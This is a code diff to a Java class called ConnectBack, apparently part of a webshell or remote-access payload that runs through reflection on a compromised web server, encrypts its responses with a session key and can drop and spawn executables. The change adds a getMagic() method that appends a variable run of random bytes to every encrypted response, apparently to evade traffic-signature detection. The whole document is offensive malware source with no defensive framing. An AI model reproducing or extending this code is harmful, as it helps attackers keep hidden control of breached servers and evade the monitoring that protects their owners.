@@ -29,6 +29,7 @@ import java.util.Iterator;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Properties;
+import java.util.Random;
 import java.util.Stack;
 import java.util.StringTokenizer;
 import javax.crypto.Cipher;
@@ -86,6 +87,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
                   so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                   write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  write.invoke(so, this.getMagic());
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
                } catch (Exception var14) {
@@ -98,6 +100,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
             so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
             write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            write.invoke(so, this.getMagic());
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
          } catch (Exception var15) {
@@ -110,6 +113,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
          write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         write.invoke(so, this.getMagic());
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
       } catch (Exception var16) {
@@ -198,6 +202,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
       int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
       String droppedExecutable = props.getProperty("DroppedExecutable");
+
       if (spawn > 0) {
          props.setProperty("Spawn", String.valueOf(spawn - 1));
          droppedFile = File.createTempFile("~spawn", ".tmp");
@@ -503,6 +508,19 @@ public class ConnectBack extends ClassLoader implements Runnable {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 
    static {
